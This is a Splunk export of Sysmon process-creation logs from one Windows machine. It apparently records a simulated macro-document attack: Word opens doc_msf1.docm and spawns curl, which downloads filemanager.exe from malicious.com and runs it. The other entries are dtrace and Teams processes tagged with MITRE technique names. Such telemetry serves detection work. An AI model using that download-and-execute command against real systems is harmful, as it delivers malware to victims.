{"preview":true,"result":{"CommandLine":"C:\\Windows\\system32\\WerFault.exe -u -p 1540 -s 4884","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Windows\\system32\\","Description":"Windows Problem Reporting","EventCode":"1","EventType":"4","FileVersion":"10.0.19041.804 (WinBuild.160101.0800)","Hashes":"SHA1=AF7F3FC4CA781D0E9C364BA285F4D49A6419806D,MD5=8507475318B4118416F40E344E04F5A3,SHA256=EC4F6C39A67E7A7AEB3E1D1914F5995AFBCE2D39DDD98224F1B4DC450A0AB9E9,IMPHASH=A8411DCFB6906C782549D77E5571DC7E","Image":"C:\\Windows\\System32\\WerFault.exe","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1137,technique_name=Office Application Startup\r\nUtcTime: 2021-02-21 19:27:59.309\r\nProcessGuid: {f589267d-b43f-6032-3513-000000002a00}\r\nProcessId: 10604\r\nImage: C:\\Windows\\System32\\WerFault.exe\r\nFileVersion: 10.0.19041.804 (WinBuild.160101.0800)\r\nDescription: Windows Problem Reporting\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: WerFault.exe\r\nCommandLine: C:\\Windows\\system32\\WerFault.exe -u -p 1540 -s 4884\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=AF7F3FC4CA781D0E9C364BA285F4D49A6419806D,MD5=8507475318B4118416F40E344E04F5A3,SHA256=EC4F6C39A67E7A7AEB3E1D1914F5995AFBCE2D39DDD98224F1B4DC450A0AB9E9,IMPHASH=A8411DCFB6906C782549D77E5571DC7E\r\nParentProcessGuid: {f589267d-b43c-6032-2e13-000000002a00}\r\nParentProcessId: 1540\r\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nParentCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_msf1.docm\" /o \"\"","OpCode":"Info","OriginalFileName":"WerFault.exe","ParentCommandLine":"\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_msf1.docm\" /o \"\"","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","ParentProcessGuid":"{f589267d-b43c-6032-2e13-000000002a00}","ParentProcessId":"1540","ProcessGuid":"{f589267d-b43f-6032-3513-000000002a00}","ProcessId":"10604","Product":"Microsoft® Windows® Operating System","RecordNumber":"95954","RuleName":"technique_id=T1137,technique_name=Office Application Startup","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:27:59.309","_raw":"02/21/2021 11:27:59 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=95954\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1137,technique_name=Office Application Startup\r\nUtcTime: 2021-02-21 19:27:59.309\r\nProcessGuid: {f589267d-b43f-6032-3513-000000002a00}\r\nProcessId: 10604\r\nImage: C:\\Windows\\System32\\WerFault.exe\r\nFileVersion: 10.0.19041.804 (WinBuild.160101.0800)\r\nDescription: Windows Problem Reporting\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: WerFault.exe\r\nCommandLine: C:\\Windows\\system32\\WerFault.exe -u -p 1540 -s 4884\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=AF7F3FC4CA781D0E9C364BA285F4D49A6419806D,MD5=8507475318B4118416F40E344E04F5A3,SHA256=EC4F6C39A67E7A7AEB3E1D1914F5995AFBCE2D39DDD98224F1B4DC450A0AB9E9,IMPHASH=A8411DCFB6906C782549D77E5571DC7E\r\nParentProcessGuid: {f589267d-b43c-6032-2e13-000000002a00}\r\nParentProcessId: 1540\r\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nParentCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_msf1.docm\" /o \"\"","_time":"2021-02-21T11:27:59.000-0800","date_hour":"11","date_mday":"21","date_minute":"27","date_month":"february","date_second":"59","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=,=__\\r:_--","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"curl -o C:\\Users\\Public\\filemanager.exe http://malicious.com/filemanager.exe && C:\\Users\\Public\\fileamanager.exe","Company":"curl, https://curl.haxx.se/","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\Desktop\\docs\\","Description":"The curl executable","EventCode":"1","EventType":"4","FileVersion":"7.55.1","Hashes":"SHA1=086F74A35D5AFED78AE50CF5586FAFFFB7845464,MD5=1C3645EBDDBE2DA6A32A5F9FB43A3C23,SHA256=0BA1C44D0EE5B34B45B449074CDA51624150DC16B3B3C38251DF6C052ADBA205,IMPHASH=2447B641444AC52A5B600C8801CE3532","Image":"C:\\Windows\\System32\\curl.exe","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1137,technique_name=Office Application Startup\r\nUtcTime: 2021-02-21 19:27:59.041\r\nProcessGuid: {f589267d-b43f-6032-3113-000000002a00}\r\nProcessId: 8676\r\nImage: C:\\Windows\\System32\\curl.exe\r\nFileVersion: 7.55.1\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.haxx.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: curl -o C:\\Users\\Public\\filemanager.exe http://malicious.com/filemanager.exe && C:\\Users\\Public\\fileamanager.exe\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=086F74A35D5AFED78AE50CF5586FAFFFB7845464,MD5=1C3645EBDDBE2DA6A32A5F9FB43A3C23,SHA256=0BA1C44D0EE5B34B45B449074CDA51624150DC16B3B3C38251DF6C052ADBA205,IMPHASH=2447B641444AC52A5B600C8801CE3532\r\nParentProcessGuid: {f589267d-b43c-6032-2e13-000000002a00}\r\nParentProcessId: 1540\r\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nParentCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_msf1.docm\" /o \"\"","OpCode":"Info","OriginalFileName":"curl.exe","ParentCommandLine":"\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_msf1.docm\" /o \"\"","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","ParentProcessGuid":"{f589267d-b43c-6032-2e13-000000002a00}","ParentProcessId":"1540","ProcessGuid":"{f589267d-b43f-6032-3113-000000002a00}","ProcessId":"8676","Product":"The curl executable","RecordNumber":"95953","RuleName":"technique_id=T1137,technique_name=Office Application Startup","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:27:59.041","_raw":"02/21/2021 11:27:59 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=95953\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1137,technique_name=Office Application Startup\r\nUtcTime: 2021-02-21 19:27:59.041\r\nProcessGuid: {f589267d-b43f-6032-3113-000000002a00}\r\nProcessId: 8676\r\nImage: C:\\Windows\\System32\\curl.exe\r\nFileVersion: 7.55.1\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.haxx.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: curl -o C:\\Users\\Public\\filemanager.exe http://malicious.com/filemanager.exe && C:\\Users\\Public\\fileamanager.exe\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=086F74A35D5AFED78AE50CF5586FAFFFB7845464,MD5=1C3645EBDDBE2DA6A32A5F9FB43A3C23,SHA256=0BA1C44D0EE5B34B45B449074CDA51624150DC16B3B3C38251DF6C052ADBA205,IMPHASH=2447B641444AC52A5B600C8801CE3532\r\nParentProcessGuid: {f589267d-b43c-6032-2e13-000000002a00}\r\nParentProcessId: 1540\r\nParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nParentCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_msf1.docm\" /o \"\"","_time":"2021-02-21T11:27:59.000-0800","date_hour":"11","date_mday":"21","date_minute":"27","date_month":"february","date_second":"59","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=,=__\\r:_--","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_msf1.docm\" /o \"\"","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\Desktop\\docs\\","Description":"Microsoft Word","EventCode":"1","EventType":"4","FileVersion":"16.0.13801.20160","Hashes":"SHA1=34FEDBE8BC105D887CD0A9806F22DA00B0D3A126,MD5=581D3C8191F703E7A10D833E5E11E42A,SHA256=7B365B3870A63AE247D22F599F178636F808388C4E43E2A3426545A86406C76D,IMPHASH=7F3EEE6930E62160D8989EDC51550522","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","IntegrityLevel":"Medium","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2021-02-21 19:27:56.128\r\nProcessGuid: {f589267d-b43c-6032-2e13-000000002a00}\r\nProcessId: 1540\r\nImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nFileVersion: 16.0.13801.20160\r\nDescription: Microsoft Word\r\nProduct: Microsoft Office\r\nCompany: Microsoft Corporation\r\nOriginalFileName: WinWord.exe\r\nCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_msf1.docm\" /o \"\"\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=34FEDBE8BC105D887CD0A9806F22DA00B0D3A126,MD5=581D3C8191F703E7A10D833E5E11E42A,SHA256=7B365B3870A63AE247D22F599F178636F808388C4E43E2A3426545A86406C76D,IMPHASH=7F3EEE6930E62160D8989EDC51550522\r\nParentProcessGuid: {f589267d-9e74-6032-8100-000000002a00}\r\nParentProcessId: 5560\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE","OpCode":"Info","OriginalFileName":"WinWord.exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ParentImage":"C:\\Windows\\explorer.exe","ParentProcessGuid":"{f589267d-9e74-6032-8100-000000002a00}","ParentProcessId":"5560","ProcessGuid":"{f589267d-b43c-6032-2e13-000000002a00}","ProcessId":"1540","Product":"Microsoft Office","RecordNumber":"95944","RuleName":"technique_id=T1204,technique_name=User Execution","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:27:56.128","_raw":"02/21/2021 11:27:56 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=95944\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2021-02-21 19:27:56.128\r\nProcessGuid: {f589267d-b43c-6032-2e13-000000002a00}\r\nProcessId: 1540\r\nImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nFileVersion: 16.0.13801.20160\r\nDescription: Microsoft Word\r\nProduct: Microsoft Office\r\nCompany: Microsoft Corporation\r\nOriginalFileName: WinWord.exe\r\nCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_msf1.docm\" /o \"\"\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=34FEDBE8BC105D887CD0A9806F22DA00B0D3A126,MD5=581D3C8191F703E7A10D833E5E11E42A,SHA256=7B365B3870A63AE247D22F599F178636F808388C4E43E2A3426545A86406C76D,IMPHASH=7F3EEE6930E62160D8989EDC51550522\r\nParentProcessGuid: {f589267d-9e74-6032-8100-000000002a00}\r\nParentProcessId: 5560\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE","_time":"2021-02-21T11:27:56.000-0800","date_hour":"11","date_mday":"21","date_minute":"27","date_month":"february","date_second":"56","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=,=_\\r:_--_","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"dtrace  -Fn \"tick-20sec {exit(0);} syscall:::entry {@[probefunc, execname, pid] = count();}\"","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\Desktop\\","Description":"DTrace/NT","EventCode":"1","EventType":"4","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Hashes":"SHA1=AB74FBAD656D45DE4411F0C48A0D12E02BF41586,MD5=FEDCA28AD0D2F057E229148218952A99,SHA256=0806EF4688C84A6066DA178563821F65C5F7464E024699DE3A0FE10C4152174E,IMPHASH=358351A0CEEDCB85263153101DBDA364","Image":"C:\\Program Files\\DTrace\\dtrace.exe","IntegrityLevel":"High","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-1d05-030000000000}","LogonId":"0x3051D","Message":"Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:27:52.446\r\nProcessGuid: {f589267d-b438-6032-2b13-000000002a00}\r\nProcessId: 4856\r\nImage: C:\\Program Files\\DTrace\\dtrace.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: DTrace/NT\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: dtrace.exe\r\nCommandLine: dtrace  -Fn \"tick-20sec {exit(0);} syscall:::entry {@[probefunc, execname, pid] = count();}\" \r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-1d05-030000000000}\r\nLogonId: 0x3051D\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=AB74FBAD656D45DE4411F0C48A0D12E02BF41586,MD5=FEDCA28AD0D2F057E229148218952A99,SHA256=0806EF4688C84A6066DA178563821F65C5F7464E024699DE3A0FE10C4152174E,IMPHASH=358351A0CEEDCB85263153101DBDA364\r\nParentProcessGuid: {f589267d-9f94-6032-7002-000000002a00}\r\nParentProcessId: 4844\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\"","OpCode":"Info","OriginalFileName":"dtrace.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\"","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{f589267d-9f94-6032-7002-000000002a00}","ParentProcessId":"4844","ProcessGuid":"{f589267d-b438-6032-2b13-000000002a00}","ProcessId":"4856","Product":"Microsoft® Windows® Operating System","RecordNumber":"95942","RuleName":"technique_id=T1059.003,technique_name=Windows Command Shell","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:27:52.446","_raw":"02/21/2021 11:27:52 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=95942\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:27:52.446\r\nProcessGuid: {f589267d-b438-6032-2b13-000000002a00}\r\nProcessId: 4856\r\nImage: C:\\Program Files\\DTrace\\dtrace.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: DTrace/NT\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: dtrace.exe\r\nCommandLine: dtrace  -Fn \"tick-20sec {exit(0);} syscall:::entry {@[probefunc, execname, pid] = count();}\" \r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-1d05-030000000000}\r\nLogonId: 0x3051D\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=AB74FBAD656D45DE4411F0C48A0D12E02BF41586,MD5=FEDCA28AD0D2F057E229148218952A99,SHA256=0806EF4688C84A6066DA178563821F65C5F7464E024699DE3A0FE10C4152174E,IMPHASH=358351A0CEEDCB85263153101DBDA364\r\nParentProcessGuid: {f589267d-9f94-6032-7002-000000002a00}\r\nParentProcessId: 4844\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\"","_time":"2021-02-21T11:27:52.000-0800","date_hour":"11","date_mday":"21","date_minute":"27","date_month":"february","date_second":"52","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=.,=__\\r:_-","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"lastrow":true,"result":{"CommandLine":"\"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --type=renderer --autoplay-policy=no-user-gesture-required --disable-background-timer-throttling --field-trial-handle=1532,1956434419288104223,12005084433099803542,131072 --enable-features=WebComponentsV0Enabled --disable-features=PictureInPicture,SpareRendererForSitePerProcess --disable-gpu-compositing --lang=en-US --enable-wer --app-user-model-id=com.squirrel.Teams.Teams --app-path=\"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\resources\\app.asar\" --electron-shared-settings=eyJjci5jb21wYW55IjoiRWxlY3Ryb24iLCJjci5kdW1wcyI6IiIsImNyLmVuYWJsZWQiOmZhbHNlLCJjci5wcm9kdWN0IjoiRWxlY3Ryb24iLCJjci5zZXNzaW9uIjoiIiwiY3IudXJsIjoiIiwiY3IudmVyc2lvbiI6IiJ9 --device-scale-factor=1 --num-raster-threads=3 --enable-main-frame-before-activation --renderer-client-id=43 --no-v8-untrusted-code-mitigations --mojo-platform-channel-handle=3236 /prefetch:1","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\","Description":"Microsoft Teams","EventCode":"1","EventType":"4","FileVersion":"1.4.00.2879","Hashes":"SHA1=F7A66CB007953E67442C9A473F772D210E4539AC,MD5=0AF216F9DC9F5E899A0B56F650A1E4EF,SHA256=B3AF485CC7B02A60C9422EAEC23821F1C92CA15221153CD32F63E8244AE38006,IMPHASH=B64D42F34FD355F7B22A35E8F64CC156","Image":"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe","IntegrityLevel":"Low","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1036,technique_name=Masquerading\r\nUtcTime: 2021-02-21 19:27:41.254\r\nProcessGuid: {f589267d-b42d-6032-1213-000000002a00}\r\nProcessId: 6588\r\nImage: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\r\nFileVersion: 1.4.00.2879\r\nDescription: Microsoft Teams\r\nProduct: Microsoft Teams\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Teams.exe\r\nCommandLine: \"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --type=renderer --autoplay-policy=no-user-gesture-required --disable-background-timer-throttling --field-trial-handle=1532,1956434419288104223,12005084433099803542,131072 --enable-features=WebComponentsV0Enabled --disable-features=PictureInPicture,SpareRendererForSitePerProcess --disable-gpu-compositing --lang=en-US --enable-wer --app-user-model-id=com.squirrel.Teams.Teams --app-path=\"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\resources\\app.asar\" --electron-shared-settings=eyJjci5jb21wYW55IjoiRWxlY3Ryb24iLCJjci5kdW1wcyI6IiIsImNyLmVuYWJsZWQiOmZhbHNlLCJjci5wcm9kdWN0IjoiRWxlY3Ryb24iLCJjci5zZXNzaW9uIjoiIiwiY3IudXJsIjoiIiwiY3IudmVyc2lvbiI6IiJ9 --device-scale-factor=1 --num-raster-threads=3 --enable-main-frame-before-activation --renderer-client-id=43 --no-v8-untrusted-code-mitigations --mojo-platform-channel-handle=3236 /prefetch:1\r\nCurrentDirectory: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Low\r\nHashes: SHA1=F7A66CB007953E67442C9A473F772D210E4539AC,MD5=0AF216F9DC9F5E899A0B56F650A1E4EF,SHA256=B3AF485CC7B02A60C9422EAEC23821F1C92CA15221153CD32F63E8244AE38006,IMPHASH=B64D42F34FD355F7B22A35E8F64CC156\r\nParentProcessGuid: {f589267d-9e99-6032-0601-000000002a00}\r\nParentProcessId: 8936\r\nParentImage: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\r\nParentCommandLine: \"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --system-initiated","OpCode":"Info","OriginalFileName":"Teams.exe","ParentCommandLine":"\"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --system-initiated","ParentImage":"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe","ParentProcessGuid":"{f589267d-9e99-6032-0601-000000002a00}","ParentProcessId":"8936","ProcessGuid":"{f589267d-b42d-6032-1213-000000002a00}","ProcessId":"6588","Product":"Microsoft Teams","RecordNumber":"95937","RuleName":"technique_id=T1036,technique_name=Masquerading","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:27:41.254","_raw":"02/21/2021 11:27:42 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=95937\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1036,technique_name=Masquerading\r\nUtcTime: 2021-02-21 19:27:41.254\r\nProcessGuid: {f589267d-b42d-6032-1213-000000002a00}\r\nProcessId: 6588\r\nImage: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\r\nFileVersion: 1.4.00.2879\r\nDescription: Microsoft Teams\r\nProduct: Microsoft Teams\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Teams.exe\r\nCommandLine: \"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --type=renderer --autoplay-policy=no-user-gesture-required --disable-background-timer-throttling --field-trial-handle=1532,1956434419288104223,12005084433099803542,131072 --enable-features=WebComponentsV0Enabled --disable-features=PictureInPicture,SpareRendererForSitePerProcess --disable-gpu-compositing --lang=en-US --enable-wer --app-user-model-id=com.squirrel.Teams.Teams --app-path=\"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\resources\\app.asar\" --electron-shared-settings=eyJjci5jb21wYW55IjoiRWxlY3Ryb24iLCJjci5kdW1wcyI6IiIsImNyLmVuYWJsZWQiOmZhbHNlLCJjci5wcm9kdWN0IjoiRWxlY3Ryb24iLCJjci5zZXNzaW9uIjoiIiwiY3IudXJsIjoiIiwiY3IudmVyc2lvbiI6IiJ9 --device-scale-factor=1 --num-raster-threads=3 --enable-main-frame-before-activation --renderer-client-id=43 --no-v8-untrusted-code-mitigations --mojo-platform-channel-handle=3236 /prefetch:1\r\nCurrentDirectory: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 